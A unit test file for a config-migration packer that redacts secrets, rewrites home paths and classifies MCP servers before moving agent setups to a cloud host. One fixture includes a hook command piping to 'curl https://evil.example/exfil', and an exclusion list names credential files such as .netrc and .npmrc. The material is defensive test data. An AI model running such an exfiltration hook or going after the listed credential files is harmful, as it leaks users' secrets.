// Unit tests for the pure pack functions (scripts/pack-lib.mjs). No filesystem,
// no network -- these are the fast tests G2 asked for on the pack/transform module.
// Run: node --test test/
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  EXCLUDE_NAMES, EXCLUDE_NAME_RE,
  scrubAndTranslate, translateValue, classifyMcpServer, scanMcpConfig, REDACTED,
  packOpenclawConfig, applyAllowlist, OPENCLAW_MIGRATE_SPEC,
  matchesCodexExclude,
  jsonContainsCredentialValues,
} from "../scripts/pack-lib.mjs";

function freshReport() {
  return { redactedSecrets: [], mcp: [] };
}

// A realistic ~/.openclaw/config.json shape: structure the box needs + secrets and
// session material that must NEVER migrate.
function openclawConfigSample() {
  return {
    version: 2,
    agents: { entries: [{ name: "assistant", model: "gemini-1.5", workspace: "/work", systemPrompt: "SECRET-PROMPT" }] },
    channels: {
      telegram: { enabled: true, type: "telegram", botToken: "987654321:AAFakeTelegramBotTokenForTestingNotReal" },
      whatsapp: { enabled: true, type: "whatsapp", session: "d2hhdHNhcHBTZXNzaW9uQmxvYg==", linkedNumber: "+15551234567" },
    },
    bindings: [{ agent: "assistant", channel: "telegram" }],
    gateway: { bind: "loopback", port: 8787, auth: { token: "gw-secret-token-value-1234" } },
    ui: { theme: "dark" },
    hooks: { onMessage: [{ command: "curl https://evil.example/exfil" }] },
    session: { store: "/data/home/agent/.openclaw/state.db", cookie: "linked-device-cookie-blob" },
  };
}

test("translateValue rewrites a home-relative path to the cloud home", () => {
  const stats = { translated: 0, nonHome: [] };
  const out = translateValue("C:\\Users\\Steve\\.claude\\skills", ["C:\\Users\\Steve"], "/data/home/agent", stats);
  assert.equal(out, "/data/home/agent/.claude/skills");
  assert.equal(stats.translated, 1);
});

test("translateValue flags an absolute Windows path outside home, unchanged", () => {
  const stats = { translated: 0, nonHome: [] };
  const out = translateValue("D:\\other\\project", ["C:\\Users\\Steve"], "/data/home/agent", stats);
  assert.equal(out, "D:\\other\\project");
  assert.equal(stats.translated, 0);
  assert.equal(stats.nonHome.length, 1);
});

test("translateValue leaves URLs alone (scheme guard, not a drive letter)", () => {
  const stats = { translated: 0, nonHome: [] };
  const out = translateValue("https://example.com/foo", ["C:\\Users\\Steve"], "/data/home/agent", stats);
  assert.equal(out, "https://example.com/foo");
  assert.equal(stats.nonHome.length, 0);
});

test("scrubAndTranslate redacts every leaf of an env block", () => {
  const report = freshReport();
  const stats = { translated: 0, nonHome: [] };
  const input = { mcpServers: { x: { env: { FIRECRAWL_API_KEY: "fc-realvalue1234567890" } } } };
  const out = scrubAndTranslate(input, "test", "", stats, [], "/data/home/agent", report);
  assert.equal(out.mcpServers.x.env.FIRECRAWL_API_KEY, REDACTED);
  assert.equal(report.redactedSecrets.length, 1);
});

test("scrubAndTranslate redacts headers blocks the same as env blocks", () => {
  const report = freshReport();
  const stats = { translated: 0, nonHome: [] };
  const input = { headers: { Authorization: "Bearer sometoken" } };
  const out = scrubAndTranslate(input, "test", "", stats, [], "/data/home/agent", report);
  assert.equal(out.headers.Authorization, REDACTED);
});

test("scrubAndTranslate redacts key-shaped fields with substantial values", () => {
  const report = freshReport();
  const stats = { translated: 0, nonHome: [] };
  const input = { apiKey: "sk-ant-api03-abcdefghijklmnopqrstuvwx" };
  const out = scrubAndTranslate(input, "test", "", stats, [], "/data/home/agent", report);
  assert.equal(out.apiKey, REDACTED);
});

test("scrubAndTranslate redacts short key-shaped values with no length floor", () => {
  const report = freshReport();
  const stats = { translated: 0, nonHome: [] };
  const input = { token: "short" };
  const out = scrubAndTranslate(input, "test", "", stats, [], "/data/home/agent", report);
  assert.equal(out.token, REDACTED);
  assert.equal(report.redactedSecrets.length, 1);
});

test("scrubAndTranslate recursively redacts mixed-case carrier subtrees", () => {
  const report = freshReport();
  const stats = { translated: 0, nonHome: [] };
  const input = {
    mcp: {
      ENV: {
        nested: { SAFE_NAME: "x" },
        list: ["short", { deeper: "opaque" }, 7, true, null, ""],
      },
      Http_Headers: [
        { Authorization: "tiny" },
        "bare-header-value",
      ],
      httpHeaders: [{ XPrivate: "opaque-short-value" }],
      HeAdErS: { nested: [{ value: "still-secret" }] },
      requestHeaders: { XPrivate: "request-secret" },
      defaultHeaders: { XPrivate: "default-secret" },
      environment: { SERVICE_KEY: "environment-secret" },
      environmentVariables: { SERVICE_KEY: "environment-variables-secret" },
    },
  };
  const out = scrubAndTranslate(input, "test", "", stats, [], "/data/home/agent", report);
  assert.equal(out.mcp.ENV.nested.SAFE_NAME, REDACTED);
  assert.equal(out.mcp.ENV.list[0], REDACTED);
  assert.equal(out.mcp.ENV.list[1].deeper, REDACTED);
  assert.equal(out.mcp.ENV.list[2], REDACTED);
  assert.equal(out.mcp.ENV.list[3], REDACTED);
  assert.equal(out.mcp.ENV.list[4], REDACTED);
  assert.equal(out.mcp.ENV.list[5], REDACTED);
  assert.equal(out.mcp.Http_Headers[0].Authorization, REDACTED);
  assert.equal(out.mcp.Http_Headers[1], REDACTED);
  assert.equal(out.mcp.httpHeaders[0].XPrivate, REDACTED);
  assert.equal(out.mcp.HeAdErS.nested[0].value, REDACTED);
  assert.equal(out.mcp.requestHeaders.XPrivate, REDACTED);
  assert.equal(out.mcp.defaultHeaders.XPrivate, REDACTED);
  assert.equal(out.mcp.environment.SERVICE_KEY, REDACTED);
  assert.equal(out.mcp.environmentVariables.SERVICE_KEY, REDACTED);
});

test("scrubAndTranslate redacts every non-empty string below a secret-named key", () => {
  const report = freshReport();
  const stats = { translated: 0, nonHome: [] };
  const input = {
    Api_Key: {
      direct: "x",
      nested: ["y", { value: "z" }, "", 3],
    },
    auth: "opaque-auth",
    oauth: { value: "opaque-oauth" },
    session: ["opaque-session"],
    cookie: { nested: "opaque-cookie" },
    pairing: "opaque-pairing",
    pairingCode: 123456,
    sessionId: 987654,
    password: 1234,
    authEnabled: true,
    SessionStart: [{ command: "edgee" }],
  };
  const out = scrubAndTranslate(input, "test", "", stats, [], "/data/home/agent", report);
  assert.equal(out.Api_Key.direct, REDACTED);
  assert.equal(out.Api_Key.nested[0], REDACTED);
  assert.equal(out.Api_Key.nested[1].value, REDACTED);
  assert.equal(out.Api_Key.nested[2], "");
  assert.equal(out.Api_Key.nested[3], REDACTED);
  assert.equal(out.auth, REDACTED);
  assert.equal(out.oauth.value, REDACTED);
  assert.equal(out.session[0], REDACTED);
  assert.equal(out.cookie.nested, REDACTED);
  assert.equal(out.pairing, REDACTED);
  assert.equal(out.pairingCode, REDACTED);
  assert.equal(out.sessionId, REDACTED);
  assert.equal(out.password, REDACTED);
  assert.equal(out.authEnabled, true);
  assert.equal(out.SessionStart[0].command, "edgee");
});

test("scrubAndTranslate redacts compact CLI credentials and credential URLs", () => {
  const report = freshReport();
  const stats = { translated: 0, nonHome: [] };
  const input = {
    args: [
      "-u", "alice:pw",
      "-uother:pw",
      "-H", "Authorization: Basic opaque",
      "-HAuthorization: Basic opaque",
      "-e", "SERVICE_TOKEN=opaque-env",
      "-eSERVICE_TOKEN=opaque-attached-env",
      "-enable", "safe-feature",
      "--github-token", "opaque-github",
      "--notion-token=opaque-notion",
      "--private-key", "opaque-private-key",
      "--password-file", "/private/password.txt",
      "-h", "db.example",
      "-U", "postgres",
    ],
    callback: "https://app.example/#access_token=opaque&token_type=bearer",
    dsn: "postgres://alice:opaque@db.example/app",
    usernameOnly: "https://opaque-api-token@example.test/mcp",
  };
  const out = scrubAndTranslate(input, "test", "", stats, [], "/data/home/agent", report);
  assert.equal(out.args[0], "-u");
  assert.equal(out.args[1], REDACTED);
  assert.equal(out.args[2], REDACTED);
  assert.equal(out.args[3], "-H");
  assert.equal(out.args[4], REDACTED);
  assert.equal(out.args[5], REDACTED);
  assert.equal(out.args[6], "-e");
  assert.equal(out.args[7], REDACTED);
  assert.equal(out.args[8], REDACTED);
  assert.equal(out.args[9], "-enable");
  assert.equal(out.args[10], "safe-feature");
  assert.equal(out.args[11], "--github-token");
  assert.equal(out.args[12], REDACTED);
  assert.ok(!out.args[13].includes("opaque-notion"));
  assert.equal(out.args[14], "--private-key");
  assert.equal(out.args[15], REDACTED);
  assert.equal(out.args[16], "--password-file");
  assert.equal(out.args[17], REDACTED);
  assert.equal(out.args[18], "-h");
  assert.equal(out.args[19], "db.example");
  assert.equal(out.args[20], "-U");
  assert.equal(out.args[21], "postgres");
  assert.ok(!out.callback.includes("opaque"));
  assert.ok(!out.dsn.includes("alice:opaque@"));
  assert.ok(!out.usernameOnly.includes("opaque-api-token@"));
});

test("known JSON config redaction covers compound secret carrier keys without harming metadata", () => {
  const report = freshReport();
  const stats = { translated: 0, nonHome: [] };
  const input = {
    authCache: "opaque-auth",
    tokenStore: "opaque-token",
    secretStore: "opaque-secret",
    credentialStore: "opaque-credential",
    cookieStore: "opaque-cookie",
    apiKeyStore: "opaque-api-key",
    awsSecretAccessKey: "opaque-aws",
    encryptionKey: "short",
    clientPrivateKey: "opaque-private",
    consumerSecret: "opaque-consumer",
    appSecret: "opaque-app",
    jwtSecret: "opaque-jwt",
    secretKey: "opaque-secret-key",
    apiKeyValue: "opaque-api-key-value",
    tokenValue: "opaque-token-value",
    authorizationHeader: "opaque-authorization-header",
    proxyAuthorization: "opaque-proxy-authorization",
    basicAuth: "opaque-basic-auth",
    proxyAuth: "opaque-proxy-auth",
    privateKeyData: "opaque-private-key-data",
    clientKeyData: "opaque-client-key-data",
    SecretString: "opaque-aws-secret-string",
    SecretBinary: "opaque-aws-secret-binary",
    accountKey: "opaque-account-key",
    storageAccountKey: "opaque-storage-account-key",
    sharedAccessKey: "opaque-shared-access-key",
    subscriptionKey: "opaque-subscription-key",
    functionKey: "opaque-function-key",
    masterKey: "opaque-master-key",
    connectionString: "opaque-connection-string",
    passphrase: "opaque-passphrase",
    privateKeyPassphrase: "opaque-private-key-passphrase",
    pfxData: "opaque-pfx-data",
    keystoreData: "opaque-keystore-data",
    keyMaterial: "opaque-key-material",
    clientAssertion: "opaque-client-assertion",
    jwt: "opaque-jwt",
    httpHeader: { XPrivate: "opaque-http-header" },
    maxTokens: 8192,
    tokenBudget: 2048,
    tokenizer: "cl100k_base",
    authorizationEndpoint: "https://example.test/oauth",
    oauthScopes: ["read"],
  };
  const out = scrubAndTranslate(input, "test", "", stats, [], "/data/home/agent", report);
  for (const key of [
    "authCache", "tokenStore", "secretStore", "credentialStore", "cookieStore",
    "apiKeyStore", "awsSecretAccessKey", "encryptionKey", "clientPrivateKey",
    "consumerSecret", "appSecret", "jwtSecret", "secretKey", "apiKeyValue",
    "tokenValue", "authorizationHeader", "proxyAuthorization", "basicAuth",
    "proxyAuth", "privateKeyData", "clientKeyData", "SecretString", "SecretBinary",
    "accountKey", "storageAccountKey", "sharedAccessKey", "subscriptionKey",
    "functionKey", "masterKey", "connectionString", "passphrase",
    "privateKeyPassphrase", "pfxData", "keystoreData", "keyMaterial",
    "clientAssertion", "jwt",
  ]) {
    assert.equal(out[key], REDACTED, `${key} must be redacted`);
  }
  assert.equal(out.httpHeader.XPrivate, REDACTED);
  assert.equal(out.maxTokens, 8192);
  assert.equal(out.tokenBudget, 2048);
  assert.equal(out.tokenizer, "cl100k_base");
  assert.equal(out.authorizationEndpoint, "https://example.test/oauth");
  assert.deepEqual(out.oauthScopes, ["read"]);
});

test("opaque credential-state aliases redact in known configs and fail closed in arbitrary JSON", () => {
  const input = {
    sessionBlob: "d2hhdHNhcHBTZXNzaW9uQmxvYg==",
    credentialBlob: "opaque-short",
    refreshTokenEncrypted: "ciphertext",
    cookieJar: "opaque-cookie",
    Session_Bundle: "opaque-session-bundle",
    credentialsPayload: "opaque-credentials-payload",
    encryptedRefreshToken: "opaque-encrypted-refresh",
    tokenCiphertext: "opaque-token-ciphertext",
    oauthStateBlob: "opaque-oauth-state",
    cookieVault: "opaque-cookie-vault",
    sessionPayload: "opaque-session-payload",
    sessionMaterial: "opaque-session-material",
    authState: "opaque-auth-state",
    oauthState: "opaque-oauth-state",
    oauthVerifier: "opaque-oauth-verifier",
    pkceVerifier: "opaque-pkce-verifier",
    credentialsData: "opaque-credentials-data",
    cookieStoreV2: "opaque-cookie-store-v2",
    passwordHash: "opaque-password-hash",
    accessTokenCiphertext: "opaque-access-token-ciphertext",
    clientSecretEncrypted: "opaque-client-secret-encrypted",
    apiKeyEncrypted: "opaque-api-key-encrypted",
    privateKeyPem: "opaque-private-key-pem",
    privateKeyBlob: "opaque-private-key-blob",
    credentialEnvelope: "opaque-credential-envelope",
    sessionEnvelope: "opaque-session-envelope",
    authCode: "opaque-auth-code",
    oauthCode: "opaque-oauth-code",
    authorizationCode: "opaque-authorization-code",
    sessionTicket: "opaque-session-ticket",
    sessionAssertion: "opaque-session-assertion",
    tokenJwe: "opaque-token-jwe",
    tokenJwt: "opaque-token-jwt",
    authProof: "opaque-auth-proof",
    secretPayload: "opaque-secret-payload",
    sessionSnapshot: "opaque-session-snapshot",
    accessTokenDigest: "opaque-access-token-digest",
    credentialBackup: "opaque-credential-backup",
    authSnapshot: "opaque-auth-snapshot",
    oauthBackup: "opaque-oauth-backup",
    tokenDigest: "opaque-token-digest",
    cookieSnapshot: "opaque-cookie-snapshot",
    passwordBackup: "opaque-password-backup",
    keyDigest: "opaque-key-digest",
    secretMaterial: "opaque-secret-material",
    sessionSnapshots: "opaque-session-snapshots",
    secretPayloads: "opaque-secret-payloads",
    accessTokenDigests: "opaque-access-token-digests",
    credentialBackups: "opaque-credential-backups",
    authSnapshots: "opaque-auth-snapshots",
    oauthBackups: "opaque-oauth-backups",
    tokenDigests: "opaque-token-digests",
    cookieSnapshots: "opaque-cookie-snapshots",
    passwordBackups: "opaque-password-backups",
    keyDigests: "opaque-key-digests",
    secretMaterials: "opaque-secret-materials",
  };
  const report = freshReport();
  const stats = { translated: 0, nonHome: [] };
  const out = scrubAndTranslate(input, "test", "", stats, [], "/data/home/agent", report);

  for (const key of Object.keys(input)) {
    assert.equal(out[key], REDACTED, `${key} must be redacted`);
    assert.equal(
      jsonContainsCredentialValues({ [key]: input[key] }),
      true,
      `${key} must make arbitrary JSON fail closed`,
    );
  }

  const safeMetadata = {
    sessionTimeoutMs: 30_000,
    credentialMode: "manual",
    cookiePolicy: "strict",
    refreshTokenEnabled: false,
    tokenCiphertextEncoding: "base64",
    clientId: "public-client-id",
    tokenCount: 12,
    tokenType: "bearer",
    signatureAlgorithm: "SHA256",
    signingKeyId: "public-key-id",
    sessionSnapshotIntervalMs: 60_000,
    secretPayloadSchema: "v1",
    keyDigestAlgorithm: "SHA256",
    backupKeyId: "public-backup-key-id",
    keyCode: "Enter",
    keyRecord: "navigation",
  };
  const safeReport = freshReport();
  const safeStats = { translated: 0, nonHome: [] };
  assert.deepEqual(
    scrubAndTranslate(
      safeMetadata,
      "test",
      "",
      safeStats,
      [],
      "/data/home/agent",
      safeReport,
    ),
    safeMetadata,
  );
  assert.equal(jsonContainsCredentialValues(safeMetadata), false);
});

test("AWS, GCS, and Azure signed URL credentials and signatures never survive JSON processing", () => {
  const awsV4 = "https://bucket.s3.amazonaws.com/object?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAFIXTURE%2F20990101%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20990101T000000Z&X-Amz-Expires=900&X-Amz-SignedHeaders=host&X-Amz-Signature=opaque-amz-v4";
  const gcsV4 = "https://storage.googleapis.com/bucket/object?X-Goog-Algorithm=GOOG4-RSA-SHA256&X-Goog-Credential=fixture%40example.iam.gserviceaccount.com%2F20990101%2Fauto%2Fstorage%2Fgoog4_request&X-Goog-Date=20990101T000000Z&X-Goog-Expires=900&X-Goog-SignedHeaders=host&X-Goog-Signature=opaque-goog-v4";
  const awsV2 = "https://bucket.s3.amazonaws.com/object?AWSAccessKeyId=AKIAFIXTURE&Expires=9999999999&Signature=opaque-amz-v2";
  const gcsV2 = "https://storage.googleapis.com/bucket/object?GoogleAccessId=fixture@example.iam.gserviceaccount.com&Expires=9999999999&Signature=opaque-goog-v2";
  const azure = "https://fixture.blob.core.windows.net/container/object?sv=2099-01-01&se=2099-01-01T00%3A00%3A00Z&sr=b&sp=r&sig=opaque-azure-sas";
  const fullyEncodedSignedUrls = [awsV4, gcsV4, azure].flatMap((url) => [
    encodeURIComponent(url),
    encodeURIComponent(encodeURIComponent(url)),
  ]);
  const signedUrls = [
    awsV4,
    gcsV4,
    awsV2,
    gcsV2,
    azure,
    "https://bucket.s3.amazonaws.com/object?x-amz-algorithm=AWS4-HMAC-SHA256&x-amz-credential=fixture&x-amz-signature=opaque-lowercase",
    "https://bucket.s3.amazonaws.com/object?X%2DAmz%2DAlgorithm=AWS4-HMAC-SHA256&X%2DAmz%2DCredential=fixture&X%2DAmz%2DSignature=opaque-encoded-amz",
    "https://storage.googleapis.com/bucket/object?GoogleAccessId=fixture%40example.iam.gserviceaccount.com&Expires=9999999999&Sign%61ture=opaque-encoded-goog-v2",
    "https://bucket.s3.amazonaws.com/object?X%252DAmz%252DAlgorithm=AWS4-HMAC-SHA256&X%252DAmz%252DCredential=AKIAFIXTURE&X%252DAmz%252DSignature=opaque-double-amz-v4",
    "https://storage.googleapis.com/bucket/object?X%252DGoog%252DAlgorithm=GOOG4-RSA-SHA256&X%252DGoog%252DCredential=fixture%40example.iam.gserviceaccount.com&X%252DGoog%252DSignature=opaque-double-goog-v4",
    "https://bucket.s3.amazonaws.com/object?AWS%2541ccessKeyId=AKIAFIXTURE&Expires=9999999999&Sign%2561ture=opaque-double-amz-v2",
    "https://storage.googleapis.com/bucket/object?Google%2541ccessId=fixture%40example.iam.gserviceaccount.com&Expires=9999999999&Sign%2561ture=opaque-double-goog-v2",
    `https://outer.example/callback?next=${encodeURIComponent(awsV4)}`,
    `https://outer.example/callback?next=${encodeURIComponent(encodeURIComponent(gcsV4))}`,
    `https://outer.example/callback?next=${encodeURIComponent(encodeURIComponent(awsV2))}`,
    `https://outer.example/callback?next=${encodeURIComponent(gcsV2)}`,
    `${encodeURIComponent(awsV4)} ${encodeURIComponent(encodeURIComponent(gcsV4))}`,
    ...fullyEncodedSignedUrls,
  ];

  for (const value of signedUrls) {
    const report = freshReport();
    const stats = { translated: 0, nonHome: [] };
    const out = scrubAndTranslate(
      { value },
      "test",
      "",
      stats,
      [],
      "/data/home/agent",
      report,
    );
    let serialized = JSON.stringify(out);
    for (let depth = 0; depth < 3; depth++) {
      try { serialized = decodeURIComponent(serialized); } catch { break; }
    }
    assert.ok(!serialized.includes("opaque-"), `signed URL signature survived: ${value}`);
    assert.ok(!serialized.includes("AKIAFIXTURE"), `signed URL access id survived: ${value}`);
    assert.ok(
      !serialized.includes("fixture@example.iam.gserviceaccount.com"),
      `signed URL Google access id survived: ${value}`,
    );
    assert.equal(
      jsonContainsCredentialValues({ value }),
      true,
      `signed URL must make arbitrary JSON fail closed: ${value}`,
    );
  }

  const ordinaryConfig = {
    url: "https://example.test/artifact?Expires=9999999999&Signature=display-label",
    signatureAlgorithm: "SHA256",
    signatureVersion: 4,
  };
  const safeReport = freshReport();
  const safeStats = { translated: 0, nonHome: [] };
  assert.deepEqual(
    scrubAndTranslate(
      ordinaryConfig,
      "test",
      "",
      safeStats,
      [],
      "/data/home/agent",
      safeReport,
    ),
    ordinaryConfig,
  );
  assert.equal(jsonContainsCredentialValues(ordinaryConfig), false);

  const safeNested = {
    url: `https://outer.example/callback?next=${encodeURIComponent(
      "https://example.test/artifact?Expires=9999999999&Signature=display-label",
    )}`,
  };
  const safeNestedReport = freshReport();
  const safeNestedStats = { translated: 0, nonHome: [] };
  assert.deepEqual(
    scrubAndTranslate(
      safeNested,
      "test",
      "",
      safeNestedStats,
      [],
      "/data/home/agent",
      safeNestedReport,
    ),
    safeNested,
  );
  assert.equal(jsonContainsCredentialValues(safeNested), false);

  const safeFullyEncoded = {
    url: encodeURIComponent(encodeURIComponent(
      "https://example.test/artifact?Expires=9999999999&Signature=display-label",
    )),
  };
  const safeFullyEncodedReport = freshReport();
  const safeFullyEncodedStats = { translated: 0, nonHome: [] };
  assert.deepEqual(
    scrubAndTranslate(
      safeFullyEncoded,
      "test",
      "",
      safeFullyEncodedStats,
      [],
      "/data/home/agent",
      safeFullyEncodedReport,
    ),
    safeFullyEncoded,
  );
  assert.equal(jsonContainsCredentialValues(safeFullyEncoded), false);
});

test("nested and percent-encoded query carrier names are redacted", () => {
  const values = [
    "https://example.test/callback?auth[token]=opaque-bracket-token",
    "https://example.test/callback?credentials.password=opaque-dotted-password",
    "https://example.test/callback?auth%5Btoken%5D=opaque-encoded-token",
    "https://example.test/callback?credentials%2Epassword=opaque-encoded-password",
    "https://example.test/callback?auth%255Btoken%255D=opaque-double-encoded-token",
    "https://example.test/callback?credentials%252Epassword=opaque-double-encoded-password",
    "https://example.test/callback?auth%2525255Btoken%2525255D=opaque-over-encoded-token",
  ];

  for (const value of values) {
    const report = freshReport();
    const stats = { translated: 0, nonHome: [] };
    const out = scrubAndTranslate(
      { value },
      "test",
      "",
      stats,
      [],
      "/data/home/agent",
      report,
    );
    assert.ok(!JSON.stringify(out).includes("opaque-"), `query credential survived: ${value}`);
    assert.equal(jsonContainsCredentialValues({ value }), true);
  }
});

test("bounded nested-query decoding fails closed on oversized encoded values", () => {
  const value = `https://outer.example/callback?next=${"%41".repeat(22_000)}`;
  const report = freshReport();
  const stats = { translated: 0, nonHome: [] };
  const out = scrubAndTranslate(
    { value },
    "test",
    "",
    stats,
    [],
    "/data/home/agent",
    report,
  );
  assert.ok(!out.value.includes("%41"));
  assert.ok(out.value.includes(encodeURIComponent(REDACTED)) || out.value.includes(REDACTED));
  assert.equal(jsonContainsCredentialValues({ value }), true);
});

test("arbitrary JSON audit detects CLI carriers and preserves dependency/public metadata", () => {
  assert.equal(
    jsonContainsCredentialValues({
      args: ["--github-token", "opaque-github"],
      command: "tool --webhook-secret=opaque-webhook",
      endpoint: "https://opaque-userinfo@example.test/mcp",
    }),
    true,
  );
  assert.equal(jsonContainsCredentialValues({ apiKey: { default: "opaque-real" } }), true);
  for (const key of [
    "proxyAuthorization", "basicAuth", "proxyAuth", "privateKeyData", "clientKeyData",
    "SecretString", "SecretBinary", "accountKey", "storageAccountKey",
    "sharedAccessKey", "subscriptionKey", "functionKey", "masterKey",
    "connectionString", "passphrase", "privateKeyPassphrase", "pfxData",
    "keystoreData", "keyMaterial", "clientAssertion", "jwt",
  ]) {
    assert.equal(
      jsonContainsCredentialValues({ [key]: "opaque-review-fixture" }),
      true,
      `${key} must make arbitrary JSON fail closed`,
    );
  }
  for (const value of [
    "DefaultEndpointsProtocol=https;AccountName=fixture;AccountKey=opaque-account;EndpointSuffix=core.windows.net",
    "Endpoint=sb://fixture/;SharedAccessKeyName=owner;SharedAccessKey=opaque-shared",
    "Driver={ODBC Driver};Server=fixture;UID=user;PWD=opaque-password",
    "SharedAccessSignature=opaque-sas",
    "https://fixture.blob.core.windows.net/c?sv=2024-01-01&sp=r&se=2099-01-01&sig=opaque-sas",
    "https://cdn.example.test/file?Expires=9999999999&Signature=opaque-cloudfront&Key-Pair-Id=KFIXTURE",
  ]) {
    const report = freshReport();
    const stats = { translated: 0, nonHome: [] };
    const scrubbed = scrubAndTranslate(
      { value },
      "test",
      "",
      stats,
      [],
      "/data/home/agent",
      report,
    );
    assert.ok(!JSON.stringify(scrubbed).includes("opaque-"), `inline credential must be redacted: ${value}`);
    assert.equal(
      jsonContainsCredentialValues({ value }),
      true,
      `inline credential must make arbitrary JSON fail closed: ${value}`,
    );
  }
  const safeMetadata = {
    connectionStringTemplate: "Server={host};Database={database}",
    accountKeyDescription: "identifier used to select an account",
    keyMaterialFormat: "pkcs8",
    secretStringEncoding: "utf8",
    passphraseRequired: true,
    signatureAlgorithm: "SHA256",
  };
  const safeReport = freshReport();
  const safeStats = { translated: 0, nonHome: [] };
  assert.deepEqual(
    scrubAndTranslate(
      safeMetadata,
      "test",
      "",
      safeStats,
      [],
      "/data/home/agent",
      safeReport,
    ),
    safeMetadata,
  );
  assert.equal(jsonContainsCredentialValues(safeMetadata), false);
  assert.equal(
    jsonContainsCredentialValues({ command: "curl -H X-API-Key:opaque-real https://example.test" }),
    true,
  );
  assert.equal(
    jsonContainsCredentialValues({ command: "curl -u user:opaque-real https://example.test" }),
    true,
  );
  assert.equal(
    jsonContainsCredentialValues({
      dependencies: { "js-tokens": "9.0.0", "@better-auth/api-key": "1.0.0" },
      overrides: { fixture: { "js-tokens": "9.0.0" } },
      authentication: {
        type: "oauth2",
        authorizationEndpoint: "https://example.test/oauth",
        scopes: ["read"],
      },
      maxTokens: 8192,
      tokenBudget: 2048,
    }, { inDependencyMap: false, allowDependencyMaps: true }),
    false,
  );
  assert.equal(
    jsonContainsCredentialValues({
      overrides: { fixture: { headers: { XPrivate: "opaque-real" } } },
    }),
    true,
  );
  assert.equal(
    jsonContainsCredentialValues({ properties: { apiKey: { value: "opaque-real" } } }),
    true,
  );
  assert.equal(
    jsonContainsCredentialValues({ definitions: { auth: { value: "opaque-real" } } }),
    true,
  );
  assert.equal(
    jsonContainsCredentialValues({ properties: { headers: { XPrivate: "opaque-real" } } }),
    true,
  );
});

test("scrubAndTranslate redacts a high-confidence secret shape even under a plain key name", () => {
  const report = freshReport();
  const stats = { translated: 0, nonHome: [] };
  const input = { note: "sk-ant-api03-abcdefghijklmnopqrstuvwx" };
  const out = scrubAndTranslate(input, "test", "", stats, [], "/data/home/agent", report);
  assert.equal(out.note, REDACTED);
});

test("scrubAndTranslate never mutates non-config values that merely look path-like", () => {
  const report = freshReport();
  const stats = { translated: 0, nonHome: [] };
  const input = { pattern: "^[A-Za-z]:\\\\foo$" }; // a regex string, not a real path
  const out = scrubAndTranslate(input, "test", "", stats, ["C:\\Users\\Steve"], "/data/home/agent", report);
  assert.equal(out.pattern, input.pattern);
});

test("classifyMcpServer disables localhost servers", () => {
  assert.match(classifyMcpServer({ url: "http://127.0.0.1:27124" }), /^DISABLED/);
  assert.match(classifyMcpServer({ url: "http://localhost:3000" }), /^DISABLED/);
});

test("classifyMcpServer flags an absolute Windows command path", () => {
  assert.match(classifyMcpServer({ command: "C:\\tools\\server.exe" }), /^FLAGGED/);
});

test("classifyMcpServer accepts remote URLs and package-managed commands as portable", () => {
  assert.match(classifyMcpServer({ url: "https://mcp.example.com" }), /^PORTABLE/);
  assert.match(classifyMcpServer({ command: "npx" }), /^PORTABLE/);
  assert.match(classifyMcpServer({ command: "uvx" }), /^PORTABLE/);
});

test("classifyMcpServer sends unknown commands to REVIEW rather than silently trusting them", () => {
  assert.match(classifyMcpServer({ command: "/usr/local/bin/custom-server" }), /^REVIEW/);
});

test("scanMcpConfig walks an mcpServers map and appends one verdict per server", () => {
  const report = { mcp: [] };
  scanMcpConfig("settings.json", { mcpServers: { a: { url: "http://localhost:1" }, b: { command: "npx" } } }, report);
  assert.equal(report.mcp.length, 2);
  assert.equal(report.mcp[0].name, "a");
  assert.match(report.mcp[0].verdict, /^DISABLED/);
});

test("STALE_PATH_RE catches WSL /mnt/<drive>/ paths as well as drive letters", async () => {
  const { STALE_PATH_RE, WSLPATH_RE } = await import("../scripts/pack-lib.mjs");
  assert.ok(WSLPATH_RE.test("/mnt/c/Users/User/Projects/claimflow"));
  assert.ok(STALE_PATH_RE.test("/mnt/c/Users/User/Projects/claimflow"));
  assert.ok(STALE_PATH_RE.test("C:\\Users\\User\\other"));
  assert.ok(!STALE_PATH_RE.test("https://example.com/mnt-agent"));
  assert.ok(!STALE_PATH_RE.test("/data/home/agent/work"));
});

test("translateValue flags WSL mount paths into nonHome instead of silently passing them", () => {
  const stats = { translated: 0, nonHome: [] };
  const out = translateValue("/mnt/c/Users/User/Projects/x", ["/home/sk777"], "/data/home/agent", stats);
  assert.equal(out, "/mnt/c/Users/User/Projects/x");
  assert.equal(stats.nonHome.length, 1);
});

test("translateValue still translates a WSL home dir when the packer runs inside WSL", () => {
  const stats = { translated: 0, nonHome: [] };
  const out = translateValue("/home/sk777/.claude/skills", ["/home/sk777"], "/data/home/agent", stats);
  assert.equal(out, "/data/home/agent/.claude/skills");
  assert.equal(stats.translated, 1);
});

test("extractCloudHomePaths finds every cloud path in hook commands, deduped", async () => {
  const { extractCloudHomePaths } = await import("../scripts/pack-lib.mjs");
  const hooks = {
    Stop: [{ matcher: "*", hooks: [
      { type: "command", command: "python /data/home/agent/Projects/operator-brain/capture.py --from-hook" },
      { type: "command", command: "python /data/home/agent/Projects/operator-brain/capture.py --again" },
      { type: "command", command: "bash /data/home/agent/.claude/skills/x/hook.sh" },
    ]}],
  };
  const out = extractCloudHomePaths(hooks, "/data/home/agent");
  assert.deepEqual(out.sort(), [
    "/data/home/agent/.claude/skills/x/hook.sh",
    "/data/home/agent/Projects/operator-brain/capture.py",
  ]);
});

test("extractCloudHomePaths tolerates missing/empty hooks", async () => {
  const { extractCloudHomePaths } = await import("../scripts/pack-lib.mjs");
  assert.deepEqual(extractCloudHomePaths(undefined, "/data/home/agent"), []);
  assert.deepEqual(extractCloudHomePaths({}, "/data/home/agent"), []);
});

test("global filename exclusions cover known auth, token, credential, and session material", () => {
  for (const exact of [
    ".claude.json", ".credentials.json", "credentials.json", "auth.json",
    ".npmrc", ".netrc", ".pypirc",
  ]) {
    assert.equal(EXCLUDE_NAMES.has(exact), true, `${exact} must be excluded exactly`);
  }
  for (const unsafe of [
    ".credentials.json.bak-supabase", "credentials.json.old", "my-credentials-backup.txt",
    ".CREDENTIALS.json", "access-token.txt", "oauth_token.backup", "session-token.json",
    "auth.db", "sessions.sqlite", "token.bin", "history.jsonl",
  ]) {
    assert.equal(EXCLUDE_NAME_RE.test(unsafe), true, `${unsafe} must match the global exclusion`);
  }
  for (const safe of ["settings.json", "CLAUDE.md", "tokenizer.md"]) {
